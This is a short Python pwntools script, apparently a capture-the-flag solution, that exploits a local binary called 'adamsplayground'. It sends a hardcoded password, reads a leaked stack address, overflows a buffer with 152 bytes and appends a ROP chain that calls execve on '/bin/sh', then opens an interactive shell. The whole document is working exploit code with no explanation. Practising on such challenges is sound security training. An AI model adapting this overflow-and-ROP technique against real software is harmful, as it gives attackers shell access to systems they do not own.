from pwn import *

p = process("./adamsplayground")
code = ELF("./adamsplayground")

gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))



p.sendline("FLAGPLS") # Enter password


# gadgets
syscall = gadget('syscall')
poprax  = gadget('pop rax; pop rdi; pop rdx; pop rsi; ret;')

def do_leak():
   p.recvuntil(", ")
   return int(p.recvline()[2:], 16)



binsh_on_stack = do_leak() + 0x3c

attack = 'A' * 152
attack += p64(poprax) + p64(59) + p64(binsh_on_stack) + p64(0) + p64(0)
attack += p64(syscall) + "/bin/sh\x00Nani"
#raw_input()
p.sendline(attack)


p.interactive()
